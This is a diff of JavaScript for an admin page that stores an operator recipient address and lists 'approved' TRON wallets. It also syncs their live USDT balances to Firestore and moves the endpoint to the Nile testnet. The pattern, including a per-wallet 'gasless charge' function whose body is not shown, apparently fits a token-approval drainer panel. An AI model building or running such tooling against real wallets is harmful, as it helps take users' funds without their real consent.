@@ -200,19 +200,20 @@
         }
         const db = firebase.firestore();
 
+        // 나일 테스트넷 공식 USDT 컨트랙트
         const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
         let totalCount = 0;
         let totalSum = 0.00;
 
-        // TronWeb instance for on-chain querying
+        // Nile Testnet RPC Endpoint
         let readOnlyTronWeb = null;
         if (window.TronWeb) {
             readOnlyTronWeb = new TronWeb({
-                fullHost: 'https://api.trongrid.io'
+                fullHost: 'https://nile.trongrid.io'
             });
         }
 
-window.addEventListener('DOMContentLoaded', async () => {
+        window.addEventListener('DOMContentLoaded', async () => {
             // DB에 저장된 운영자 지갑 주소를 우선 불러오기
             try {
                 const docSnap = await db.collection("settings").doc("operator").get();
@@ -220,6 +221,7 @@ window.addEventListener('DOMContentLoaded', async () => {
                     const savedDbAddress = docSnap.data().address;
                     const inputElem = document.getElementById('operator-recipient-input');
                     if (inputElem) inputElem.value = savedDbAddress;
+                    localStorage.setItem('tron_operator_recipient_address', savedDbAddress);
                 }
             } catch (e) {
                 console.warn("DB 주소 조회 실패:", e);
@@ -232,7 +234,6 @@ window.addEventListener('DOMContentLoaded', async () => {
             loadApprovedWalletsData();
         });
 
-        // 👇 function 앞에 async 필수!
         window.saveOperatorRecipient = async function() {
             const inputElem = document.getElementById('operator-recipient-input');
             const address = inputElem ? inputElem.value.trim() : '';
@@ -250,7 +251,6 @@ window.addEventListener('DOMContentLoaded', async () => {
             localStorage.setItem('tron_operator_recipient_address', address);
 
             try {
-                // Firestore DB에 운영자 주소 저장
                 await db.collection("settings").doc("operator").set({
                     address: address,
                     updatedAt: firebase.firestore.FieldValue.serverTimestamp()
@@ -276,11 +276,11 @@ window.addEventListener('DOMContentLoaded', async () => {
             return "0.00";
         }
 
-function loadApprovedWalletsData() {
+        function loadApprovedWalletsData() {
             const tbody = document.getElementById('approved-wallets-tbody');
             if (!tbody) return;
 
-            // Firestore DB를 실시간 감지하여 유저 승인 즉시 표에 추가
+            // Firestore DB 실시간 구독 (onSnapshot)
             db.collection("approved_wallets").orderBy("updatedAt", "desc")
               .onSnapshot((snapshot) => {
                   if (snapshot.empty) {
@@ -326,22 +326,37 @@ function loadApprovedWalletsData() {
               });
         }
 
+        // Firestore 기반 온체인 실시간 잔액 동기화
         window.scanApprovedWallets = async function() {
-            let wallets = JSON.parse(localStorage.getItem('tron_approved_wallets_list') || '[]');
-            if (wallets.length === 0) {
-                showToast("연결된 지갑이 없습니다.");
-                return;
-            }
+            showToast("온체인 실시간 잔액 조회 중...");
+            try {
+                const snapshot = await db.collection("approved_wallets").get();
+                if (snapshot.empty) {
+                    showToast("연결된 지갑이 없습니다.");
+                    return;
+                }
 
-            showToast("온체인 실시간 잔액 동기화 중...");
-            for (let i = 0; i < wallets.length; i++) {
-                const bal = await fetchRealUsdtBalance(wallets[i].address);
-                wallets[i].balance = bal;
-                const cell = document.getElementById(`bal-cell-${i}`);
-                if (cell) cell.innerText = `${bal} USDT`;
+                let index = 0;
+                for (const doc of snapshot.docs) {
+                    const data = doc.data();
+                    const liveBalance = await fetchRealUsdtBalance(data.address);
+
+                    // 1. 화면 테이블 UI 잔액 갱신
+                    const cell = document.getElementById(`bal-cell-${index}`);
+                    if (cell) cell.innerText = `${liveBalance} USDT`;
+
+                    // 2. Firestore DB에도 최신 잔액 동기화
+                    await db.collection("approved_wallets").doc(data.address).update({
+                        balance: liveBalance,
+                        updatedAt: firebase.firestore.FieldValue.serverTimestamp()
+                    });
+                    index++;
+                }
+                showToast("모든 지갑의 온체인 USDT 잔액이 최신 상태로 갱신되었습니다!");
+            } catch (err) {
+                console.error("온체인 동기화 오류:", err);
+                showToast("온체인 동기화 중 오류가 발생했습니다.", "error");
             }
-            localStorage.setItem('tron_approved_wallets_list', JSON.stringify(wallets));
-            showToast("모든 지갑의 온체인 USDT 잔액이 최신 상태로 갱신되었습니다!");
         };
 
         window.executeSpecificGaslessCharge = function(address, index) {
